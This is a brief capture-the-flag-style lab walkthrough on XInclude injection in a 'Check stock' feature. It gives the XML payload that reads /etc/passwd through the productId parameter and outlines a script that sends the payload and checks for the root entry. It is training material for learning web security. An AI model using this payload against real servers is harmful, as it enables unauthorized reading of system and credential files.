### Lab: Exploiting XInclude to retrieve files

This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.

Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.

To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.

_____

Analysis and Exploit:

1. Intercept request of the "Check stock" feature
    - POST **/product/stock**
    - productId=1&storeId=1

2. Inject payload

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
    - productId=[PAYLOAD]&storeId=1

_____

Script:

1. Take arguments, if less than 2 print usage instructions and exit
2. Send payload | POST **/product/stock** | params:productId, storeId
    - productId = [PAYLOAD]
    - storeId = 1

PAYLOAD:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
    - if "root:x:0:0:root:/root:/bin/bash" in response text, exploit works!
        - print body